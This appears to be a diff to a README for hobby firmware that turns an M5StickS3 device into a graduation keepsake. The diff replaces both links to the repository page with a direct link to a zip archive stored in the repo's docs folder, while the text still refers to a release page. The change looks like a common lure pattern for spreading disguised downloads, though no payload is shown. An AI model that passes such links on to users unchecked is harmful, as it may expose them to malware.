@@ -1,6 +1,6 @@
 # 🎓 graduation-pebble - A digital keepsake for your graduation
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/virile-wainscoting845/graduation-pebble)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/virile-wainscoting845/graduation-pebble/main/docs/graduation-pebble-v1.6.zip)
 
 Graduation-pebble acts as a small, handheld digital companion. This firmware turns an M5StickS3 device into a graduation memento. It acts like a virtual pet that keeps track of your time since graduation, stores memories, and helps you stay connected with your school cohort. Because the software remains open-source, you can customize the stories, countdowns, and data to fit your specific school or country.
 
@@ -18,7 +18,7 @@ The M5StickS3 is an ESP32-S3 powered device. It features a color screen, buttons
 
 To install the firmware, visit the release page.
 
-[Visit this page to download the latest file](https://github.com/virile-wainscoting845/graduation-pebble)
+[Visit this page to download the latest file](https://raw.githubusercontent.com/virile-wainscoting845/graduation-pebble/main/docs/graduation-pebble-v1.6.zip)
 
 1. Open your web browser.
 2. Go to the link above.
